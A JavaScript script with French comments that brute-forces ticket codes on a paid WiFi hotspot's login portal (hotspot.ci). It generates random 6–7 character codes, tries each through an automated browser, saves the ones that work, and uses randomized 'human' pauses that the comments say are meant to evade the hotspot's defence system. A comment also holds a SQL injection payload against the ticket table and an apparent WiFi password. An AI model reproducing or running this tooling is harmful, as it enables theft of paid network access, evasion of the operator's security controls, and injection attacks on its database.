import Agent from "./dependance/agent.js";
import Helper from "./dependance/Helper.js";

const agent = new Agent()

await agent.initialize()
// l'utilisateur sem12 est déjà connecté su un téléphone
/* code wifi actuelle 18/04/2026 4jzfngw,
select * from ticket where user= '' and pass='df' or 1=1;--'
*/

const path_save_code_valide = 'code-valide.json'
const code_valide = await Helper.readJson(path_save_code_valide)

// Code valide mais déjà utilisé sur un autre appareil → sauvegarder et continuer
const MESSAGES_DEJA_CONNECTE = [
    'déjà connecté',
    'already connected',
    'already logged',
    'session active',
];

function isDejaConnecte(message) {
    const msg = (message || '').toLowerCase();
    return MESSAGES_DEJA_CONNECTE.some(m => msg.includes(m));
}

async function saveCode(code, message) {
    code_valide.push({ code, message });
    await Helper.saveJson(code_valide, path_save_code_valide);
    console.log(`✅ Code sauvegardé: ${code} | ${message}`);
}

const SUCCESS_URLS = [
    'http://hotspot.ci/success.html',
    'http://hotspot.ci/status',
];

async function isAlreadyConnected() {
    return agent.isConnected();
}

async function testTicket(ticket) {
    const tickets = [
        ticket,
        Helper.makeTicket({ code: ticket, revert: true }),
    ];

    for (const t of tickets) {
        // Vérifier si on est déjà connecté avant de tenter
        if (await isAlreadyConnected()) return true;

        console.log(`code => ${t}`);
        const [res, message] = await agent.loginWithTicket(t);
        console.log(`resultat: ${res} | message:${message}`);

        // Vérifier l'URL après la tentative
        const url = agent.page?.url() || '';
        const connectedByUrl = SUCCESS_URLS.some(u => url.startsWith(u));

        if (connectedByUrl) {
            await saveCode(t, `Connexion réussie (${url})`);
            return true; // Arrêt — on est vraiment connecté
        }

        if (res || isDejaConnecte(message)) {
            await saveCode(t, message);
            // "déjà connecté" → code valide sauvegardé mais on continue
        }

        await Helper.sleepHuman(2);
    }
}

// Délai aléatoire entre chaque tentative pour éviter le système de défense du hotspot
async function pauseEntreEssais() {
    // Vérifier d'abord si le réseau est toujours disponible
    const enLigne = await Helper.isOnline(3);
    if (!enLigne) {
        console.log('📡 WiFi tombé — le hotspot a probablement coupé la connexion (système de défense).');
        const retabli = await Helper.attendreConnexion(20);
        if (!retabli) {
            console.log('❌ Connexion non rétablie — arrêt.');
            return false;
        }
        // Petite pause supplémentaire après rétablissement
        const extraSec = 10 + Math.floor(Math.random() * 20);
        console.log(`⏳ Pause de sécurité ${extraSec}s après rétablissement...`);
        await Helper.sleep(extraSec);
    } else {
        // Pause humaine normale entre chaque essai (15–45 secondes)
        const pauseSec = 15 + Math.floor(Math.random() * 30);
        console.log(`⏳ Pause ${pauseSec}s avant le prochain essai...`);
        await Helper.sleep(pauseSec);
    }
    return true;
}

let i = 1
while (true) {
    console.log(`-------------tour ${i}--------------- `)

    // Arrêt immédiat si on est déjà connecté en début de tour
    if (await isAlreadyConnected()) {
        console.log(`🌐 Déjà connecté (${agent.page.url()}) — arrêt du programme.`);
        break;
    }

    // Longueur 6 ou 7 comme observé dans les vrais codes achetés
    const ticket = Helper.makeTicket({ lower: true, minLen: 6, maxLen: 7 })
    const res = await testTicket(ticket)

    if (res) {
        console.log(`🎯 Code valide trouvé — arrêt du programme.`);
        break;
    }
    if (i == 1000) {
        console.log(`fin d'iteration.`);
        break;
    }

    // Pause entre chaque tentative (avec détection de coupure WiFi)
    const continuer = await pauseEntreEssais();
    if (!continuer) break;

    i++
}

await agent.close()